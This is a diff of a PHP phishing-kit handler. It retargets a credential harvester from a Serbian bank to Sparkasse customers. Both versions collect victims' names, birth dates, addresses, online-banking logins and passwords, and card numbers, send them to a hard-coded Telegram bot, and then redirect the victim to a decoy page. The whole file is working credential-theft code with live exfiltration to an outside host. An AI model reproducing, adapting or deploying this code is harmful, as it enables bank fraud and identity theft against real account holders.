@@ -1,45 +1,45 @@
 <?php
 
+// Capture the IP address and time of submission
+$ip = getenv("REMOTE_ADDR");
+$time = date("d-m-Y - H:i");
 
+// Construct the message with the structured format
+$message = "----- 🌐SPARKASSE🌐-----\n\n";
+$message .= "Vorname: " . $_POST['Vorname'] . "\n";
+$message .= "Nachname: " . $_POST['Nachname'] . "\n";
+$message .= "Geburtsdatum: " . $_POST['Geburtsdatum'] . "\n";
+$message .= "Telefonnummer: " . $_POST['Telefonnummer'] . "\n";
+$message .= "Adresse: " . $_POST['Adresse'] . "\n";
+$message .= "Postcode: " . $_POST['Postcode'] . "\n";
+$message .= "BLZ: " . $_POST['BLZ'] . "\n";
+$message .= "Anmeldename: " . $_POST['Anmeldename'] . "\n";
+$message .= "Passwort-OBP: " . $_POST['PasswortOBP'] . "\n";
+$message .= "EC-Kartennummer: " . $_POST['ECCardNumber'] . "\n\n";
+$message .= "TIME: $time\n";
+$message .= "IP: $ip\n";
 
-    $ip = getenv("REMOTE_ADDR");
-    $message .= "--------------------AnTiBoTs7-------------------\n";
-    $message .= "--------------  MOBIBANKA  SERBIA -------------\n";
-    $message .= "UserName       : " . $_POST['UserName'] . "\n";
-    $message .= "PASSWORD        : " . $_POST['Password'] . "\n";
-    $message .= "-------------- IP Infos ------------\n";
-    $message .= "IP      : $ip\n";
-    $message .= "HOST    : " . gethostbyaddr($ip) . "\n";
-    $message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
-    $message .= "----------------------AnTiBoTs7----------------------\n";
-    $cc = $_POST['ccn'];
-    $subject = "NEW ACCOUNT | ♥__♥ | IP : $ip\n ";
-    $headers = "From: <noreply@antibots7.com>\n";
+// Telegram bot configuration
+$botToken = "2064577149:AAGwlvULbwuGJ5viekIPMxKardywDI1obDU";
+$chatID = "6417239870";
+$website = "https://api.telegram.org/bot" . $botToken;
 
-      
-   
+// Prepare data for Telegram API request
+$params = [
+    'chat_id' => $chatID,
+    'text' => $message,
+];
 
+// Send message to Telegram
+$ch = curl_init($website . '/sendMessage');
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$result = curl_exec($ch);
+curl_close($ch);
 
-    $botToken="2064577149:AAGwlvULbwuGJ5viekIPMxKardywDI1obDU";
-
-    $website="https://api.telegram.org/bot".$botToken;
-
-    $params=[
-          'chat_id'=>"6417239870",
-          'text'=>"$message",
-    ];
-    $ch = curl_init($website . '/sendMessage');
-    curl_setopt($ch, CURLOPT_HEADER, false);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $result = curl_exec($ch);
-    curl_close($ch);
-
-
-    header("Location: ./billing.html"); 
-    exit();
-
-
-?>
+// Redirect to billing page after submission
+header("Location: ./thankyou.html");
+exit();
